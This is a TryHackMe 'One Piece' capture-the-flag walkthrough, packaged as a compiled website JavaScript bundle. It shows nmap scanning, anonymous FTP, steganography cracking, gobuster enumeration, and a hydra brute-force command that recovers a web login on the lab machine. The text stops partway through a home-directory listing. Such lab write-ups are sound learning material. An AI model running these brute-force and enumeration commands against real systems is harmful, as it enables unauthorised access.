"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[165],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>m});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var i=a.createContext({}),h=function(e){var t=a.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},u=function(e){var t=h(e.components);return a.createElement(i.Provider,{value:t},e.children)},c="mdxType",p={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,i=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),c=h(n),d=r,m=c["".concat(i,".").concat(d)]||c[d]||p[d]||o;return n?a.createElement(m,s(s({ref:t},u),{},{components:n})):a.createElement(m,s({ref:t},u))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,s=new Array(o);s[0]=d;var l={};for(var i in t)hasOwnProperty.call(t,i)&&(l[i]=t[i]);l.originalType=e,l[c]="string"==typeof e?e:r,s[1]=l;for(var h=2;h<o;h++)s[h]=n[h];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},4423:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>s,default:()=>p,frontMatter:()=>o,metadata:()=>l,toc:()=>h});var a=n(87462),r=(n(67294),n(3905));const o={},s="One Piece",l={unversionedId:"Tryhackme/One Piece/One Piece",id:"Tryhackme/One Piece/One Piece",title:"One Piece",description:"A CTF room based on the wonderful manga One Piece. Can you become the Pirate King?",source:"@site/writeups/Tryhackme/One Piece/One Piece.md",sourceDirName:"Tryhackme/One Piece",slug:"/Tryhackme/One Piece/",permalink:"/writeups/Tryhackme/One Piece/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"OhSINT",permalink:"/writeups/Tryhackme/OhSINT/"},next:{title:"Overpass",permalink:"/writeups/Tryhackme/Overpass/"}},i={},h=[{value:"Task 1 Set Sail",id:"task-1-set-sail",level:2},{value:"Task 2 Road Poneglyphs",id:"task-2-road-poneglyphs",level:2},{value:"Task 3 Laugh Tale",id:"task-3-laugh-tale",level:2}],u={toc:h},c="wrapper";function p(e){let{components:t,...o}=e;return(0,r.kt)(c,(0,a.Z)({},u,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"one-piece"},"One Piece"),(0,r.kt)("p",null,"A CTF room based on the wonderful manga One Piece. Can you become the Pirate King?"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/ctfonepiece65"},"One Piece")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Steganography"),(0,r.kt)("li",{parentName:"ul"},"Web Poking"),(0,r.kt)("li",{parentName:"ul"},"Crypthography",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"Base32"),(0,r.kt)("li",{parentName:"ul"},"Base64"),(0,r.kt)("li",{parentName:"ul"},"Base85"),(0,r.kt)("li",{parentName:"ul"},"Base91"),(0,r.kt)("li",{parentName:"ul"},"Morse Code"),(0,r.kt)("li",{parentName:"ul"},"Binary"),(0,r.kt)("li",{parentName:"ul"},"Hex"))),(0,r.kt)("li",{parentName:"ul"},"OSINT"),(0,r.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Reverse Enigieering"),(0,r.kt)("li",{parentName:"ul"},"Stored Passwords & Keys")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-set-sail"},"Task 1 Set Sail"),(0,r.kt)("p",null,"Welcome to the One Piece room."),(0,r.kt)("p",null,"Your dream is to find the One Piece and hence to become the Pirate King."),(0,r.kt)("p",null,"Once the VM is deployed, you will be able to enter a World full of Pirates."),(0,r.kt)("p",null,"Please notice that pirates do not play fair. They can create rabbit holes to trap you."),(0,r.kt)("p",null,"This room may be a bit different to what you are used to:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Required skills to perform the intended exploits are pretty basic."),(0,r.kt)("li",{parentName:"ul"},'However, solving the (let\'s say) "enigmas" to know what you need to do may be trickier.')),(0,r.kt)("p",null,"This room is some sort of game, some sort of puzzle."),(0,r.kt)("p",null,"Please note that if you are currently reading/watching One Piece and if you did not finish Zou arc, you will get spoiled during this room."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Deploy the machine and hoist the sails")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("h2",{id:"task-2-road-poneglyphs"},"Task 2 Road Poneglyphs"),(0,r.kt)("p",null,"In order to reach Laugh Tale, the island where the One Piece is located, you must collect the 4 Road Poneglyphs."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/One Piece$ sudo nmap -A -sS -sC -sV -O 10.10.93.198\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 12:31 CEST\nNmap scan report for 10.10.93.198\nHost is up (0.061s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             187 Jul 26 07:27 welcome.txt\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 01:18:18:f9:b7:8a:c3:6c:7f:92:2d:93:90:55:a1:29 (RSA)\n|   256 cc:02:18:a9:b5:2b:49:e4:5b:77:f9:6e:c2:db:c9:0d (ECDSA)\n|_  256 b8:52:72:e6:2a:d5:7e:56:3d:16:7b:bc:51:8c:7b:2a (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: New World\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/11%OT=21%CT=1%CU=35961%PV=Y%DS=2%DC=T%G=Y%TM=5F82DF\nOS:24%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)SE\nOS:Q(SP=100%GCD=1%ISR=108%TI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%\nOS:O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2\nOS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS\nOS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   32.28 ms 10.8.0.1\n2   63.04 ms 10.10.93.198\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 31.79 seconds\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/One Piece$ ftp 10.10.93.198\nConnected to 10.10.93.198.\n220 (vsFTPd 3.0.3)\nName (10.10.93.198:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    3 0        0            4096 Jul 26 07:41 .\ndrwxr-xr-x    3 0        0            4096 Jul 26 07:41 ..\ndrwxr-xr-x    2 0        0            4096 Jul 26 07:42 .the_whale_tree\n-rw-r--r--    1 0        0             187 Jul 26 07:27 welcome.txt\n226 Directory send OK.\nftp> get welcome.txt\nlocal: welcome.txt remote: welcome.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for welcome.txt (187 bytes).\n226 Transfer complete.\n187 bytes received in 0.00 secs (956.1110 kB/s)\nftp> cd .the_whale_tree\n250 Directory successfully changed.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        0            4096 Jul 26 07:42 .\ndrwxr-xr-x    3 0        0            4096 Jul 26 07:41 ..\n-rw-r--r--    1 0        0            8652 Jul 26 07:42 .road_poneglyph.jpeg\n-rw-r--r--    1 0        0            1147 Jul 26 07:42 .secret_room.txt\n226 Directory send OK.\nftp> get .road_poneglyph.jpeg\nlocal: .road_poneglyph.jpeg remote: .road_poneglyph.jpeg\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for .road_poneglyph.jpeg (8652 bytes).\n226 Transfer complete.\n8652 bytes received in 0.00 secs (4.8309 MB/s)\nftp> get .secret_room.txt\nlocal: .secret_room.txt remote: .secret_room.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for .secret_room.txt (1147 bytes).\n226 Transfer complete.\n1147 bytes received in 0.00 secs (2.4471 MB/s)\nftp> exit\n221 Goodbye.\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/One Piece$ cat welcome.txt\nWelcome to Zou. It is an island located on the back of a massive, millennium-old elephant named Zunesha that roams the New World.\nExcept this, there is not much to say about this island.\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/One Piece$ cat .secret_room.txt\nInuarashi: You reached the center of the Whale, the majestic tree of Zou.\nNekomamushi: We have hidden this place for centuries.\nInuarashi: Indeed, it holds a secret.\nNekomamushi: Do you see this red stele ? This is a Road Poneglyph.\nLuffy: A Road Poneglyph ??\nInuarashi: There are four Road Poneglyphs around the world. Each of them gives one of the key to reach Laugh Tale and to find the One Piece.\nLuffy: The One Piece ?? That's my dream ! I will find it and I will become the Pirate King !!!\nNekomamushi: A lot have tried but only one succeeded over the centuries, Gol D Roger, the former Pirate King.\nInuarashi: It is commonly known that both Emperors, Big Mom and Kaido, own a Road Poneglyph but no one knows where is the last one.\nNekomamushi: The other issue is the power of Big Mom and Kaido, they are Emperor due to their strength, you won't be able to take them down easily.\nLuffy: I will show them, there can be only one Pirate King and it will be me !!\nInuarashi: There is another issue regarding the Road Poneglyph.\nNekomamushi: They are written in an ancient language and a very few people around the world can actually read them.\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/One Piece$ steghide extract -sf .road_poneglyph.jpeg\nEnter passphrase:\nwrote extracted data to "road_poneglyphe1.txt".\nkali@kali:~/CTFs/tryhackme/One Piece$ cat road_poneglyphe1.txt\nFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIK\nkali@kali:~/CTFs/tryhackme/One Piece$\n')),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"view-source:http://10.10.93.198/"},"view-source:http://10.10.93.198/")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n  <head lang="en">\n    <title>New World</title>\n    <link rel="stylesheet" href="./css/style.css" />\n    <link rel="icon" href="./images/luffy_icon.png" type="image/png" />\n    <meta charset="utf-8" />\n  </head>\n\n  <body>\n    <img src="./images/boat.png" alt="Boat" title="Boat" />\n    <p>\n      Straw Hat Luffy and his crew are sailing in the New World. <br />\n      They have only one thing in mind, reach the One Piece and hence become the\n      Pirate King, that is to say the freest man in the world.<br />\n      <br />\n      Unfortunately, your navigator Nami lost the Log Pose and as you know, it\n      is not possible to properly steer without it.<br />\n      You need to find the Log Pose to be able to reach the next island.\n      \x3c!--J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5--\x3e\n    </p>\n  </body>\n</html>\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/One Piece$ echo -n 'J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5' | base32 -d | base64 -d\n:18!R+D#G3F`M&7+EV:.Eb-A%Eb-A4Eb/`pF(K05+>Yi51*COSF)u&)Ch4`.CgggbF!,[?ATD?)F(f,-@rHL+A0>PoG%De4Df^\"CBlks\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Nami ensures there are precisely 3472 possible places where she could have lost it.")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://github.com/1FreyR/LogPose"},"https://github.com/1FreyR/LogPose")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/One Piece$ gobuster dir -u 10.10.93.198 -w LogPose.txt -x txt,php,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.93.198\n[+] Threads:        10\n[+] Wordlist:       LogPose.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     txt,php,html\n[+] Timeout:        10s\n===============================================================\n2020/10/11 12:49:28 Starting gobuster\n===============================================================\n/dr3ssr0s4.html (Status: 200)\nProgress: 2041 / 3472 (58.78%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/11 12:49:58 Finished\n===============================================================\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.93.198/dr3ssr0s4.html"},"http://10.10.93.198/dr3ssr0s4.html")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Donquixote Doflamingo")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"view-source:http://10.10.93.198/css/dressrosa_style.css"},"view-source:http://10.10.93.198/css/dressrosa_style.css")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-css"},'#container {\n  height: 75vh;\n  width: 90vw;\n  margin: 1vh;\n  background-image: url("../king_kong_gun.jpg");\n  background-repeat: no-repeat;\n  background-position: center;\n  background-size: cover;\n  display: flex;\n  flex-direction: row;\n  justify-content: center;\n  align-items: flex-start;\n  align-content: flex-start;\n  flex-wrap: wrap;\n  position: relative;\n}\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/One Piece$ exiftool king_kong_gun.jpg\nExifTool Version Number         : 12.06\nFile Name                       : king_kong_gun.jpg\nDirectory                       : .\nFile Size                       : 42 kB\nFile Modification Date/Time     : 2020:07:26 13:26:42+02:00\nFile Access Date/Time           : 2020:10:11 12:57:18+02:00\nFile Inode Change Date/Time     : 2020:10:11 12:57:03+02:00\nFile Permissions                : rw-r--r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.01\nResolution Unit                 : inches\nX Resolution                    : 72\nY Resolution                    : 72\nComment                         : Doflamingo is /ko.jpg\nImage Width                     : 736\nImage Height                    : 414\nEncoding Process                : Progressive DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\nImage Size                      : 736x414\nMegapixels                      : 0.305\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"strings ko.png\n\nCongratulations, this is the Log Pose that should lead you to the next island: /wh0l3_c4k3.php\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.93.198/wh0l3_c4k3.php"},"http://10.10.93.198/wh0l3_c4k3.php")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},"<p>\n  You are on Whole Cake Island. This is the territory of Big Mom, one of the 4\n  Emperors, this is to say one of the 4 pirates the closest to the One Piece but\n  also the strongest.<br />\n  Big Mom chases you and want to destroy you. It is unthinkable to fight her\n  directly.<br />\n  You need to find a way to appease her.\n  \x3c!--Big Mom likes cakes--\x3e\n</p>\n")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(49441).Z,width:"1590",height:"170"})),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"CakeForYou")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(39626).Z,width:"1920",height:"301"})),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.93.198/r4nd0m.html"},"http://10.10.93.198/r4nd0m.html")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Buggy the Clown")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"view-source:http://10.10.93.198/buggy_games/brain_teaser.js"},"view-source:http://10.10.93.198/buggy_games/brain_teaser.js")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-js"},'var xDegOld = 0;\nvar yDegOld = 0;\nvar xDegNew = 0;\nvar yDegNew = 0;\nvar xCoordNew = 0;\nvar yCoordNew = 0;\nvar screenWidth = document.querySelector("body").clientWidth;\nconsole.log(screenWidth);\nvar screenHeight = document.querySelector("body").clientHeight;\nconsole.log(screenHeight);\nvar cube = document.getElementById("container__animation");\n\nfunction degDetermination() {\n  xDegOld = xDegNew;\n  yDegOld = yDegNew;\n  xDegNew = -(-180 + (yCoordNew / screenHeight) * 360) / 4;\n  yDegNew = (-180 + (xCoordNew / screenWidth) * 360) / 4;\n}\n\nfunction cubeMovement() {\n  degDetermination();\n  cube.animate(\n    [\n      { transform: "rotateX(" + xDegOld + "deg) rotateY(" + yDegOld + "deg)" },\n      { transform: "rotateX(" + xDegNew + "deg) rotateY(" + yDegNew + "deg)" },\n    ],\n    {\n      duration: 10,\n    }\n  );\n  cube.style.transform =\n    "rotateX(" + xDegNew + "deg) rotateY(" + yDegNew + "deg)";\n}\n\ndocument.getElementById("back").textContent = "Log Pose: /0n1g4sh1m4.php";\n\nwindow.addEventListener("mousemove", function (e) {\n  xCoordNew = e.clientX;\n  yCoordNew = e.clientY;\n  cubeMovement();\n});\n')),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.93.198/0n1g4sh1m4.php"},"http://10.10.93.198/0n1g4sh1m4.php")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Kaido of the Beasts")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/One Piece$ stegcracker kaido.jpeg /usr/share/wordlists/rockyou.txt\nStegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)\nCopyright (c) 2020 - Luke Paris (Paradoxis)\n\nCounting lines in wordlist..\nAttacking file 'kaido.jpeg' with wordlist '/usr/share/wordlists/rockyou.txt'..\nSuccessfully cracked file with password: imabeast\nTried 106372 passwords\nYour file has been written to: kaido.jpeg.out\nimabeast\nkali@kali:~/CTFs/tryhackme/One Piece$ cat kaido.jpeg.out\nUsername:K1ng_0f_th3_B3@sts\n\nkali@kali:~/CTFs/tryhackme/One Piece$ hydra -l K1ng_0f_th3_B3@sts -P /usr/share/wordlists/rockyou.txt 10.10.93.198 http-post-form \"/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR\" -t 64\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-11 13:52:40\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task\n[DATA] attacking http-post-form://10.10.93.198:80/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR\n[STATUS] 10070.00 tries/min, 10070 tries in 00:01h, 14334329 to do in 23:44h, 64 active\n[80][http-post-form] host: 10.10.93.198   login: K1ng_0f_th3_B3@sts   password: thebeast\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-11 13:54:35\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Unfortunately, the location of this last Poneglyph is unspecified.\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"From_Base32('A-Z2-7=',true)\nFrom_Morse_Code('Space','Line feed')\nFrom_Binary('Space')\nFrom_Hex('Auto')\nFrom_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)\nFrom_Base64('A-Za-z0-9+/=',true)\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.93.198/unspecified"},"http://10.10.93.198/unspecified")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"M0nk3y_D_7uffy@Laugh-Tale:~$ ls -la\ntotal 56\ndrwxr-xr-x  8 M0nk3y_D_7uffy luffy 4096 Jul 29 07:32 .\ndrwxr-xr-x  4 root           root  4096 Jul 26 07:54 ..\n-rw-------  1 M0nk3y_D_7uffy luffy   14 Aug 14 15:25 .bash_history\n-rw-r--r--  1 M0nk3y_D_7uffy luffy  220 Jul 26 07:54 .bash_logout\n-rw-r--r--  1 M0nk3y_D_7uffy luffy 3771 Jul 26 07:54 .bashrc\ndrwx------ 11 M0nk3y_D_7uffy luffy 4096 Jul 29 07:21 .cache\ndrwx------ 11 M0nk3y_D_7uffy luffy 4096 Jul 29 07:15 .config\ndrwx------  3 M0nk3y_D_7uffy luffy 4096 Jul 29 07:21 .gnupg\n-rw-------  1 M0nk3y_D_7uffy luffy  334 Jul 29 07:14 .ICEauthority\n-rw-r--r--  1 root           root   283 Jul 26 08:23 laugh_tale.txt\ndrwx------  3 M0nk3y_D_7uffy luffy 4096 Jul 29 07:14 .local\ndrwx------  5 M0nk3y_D_7uffy luffy 4096 Jul 29 07:15 .mozilla\n-rw-r--r--  1 M0nk3y_D_7uffy luffy  807 Jul 26 07:54 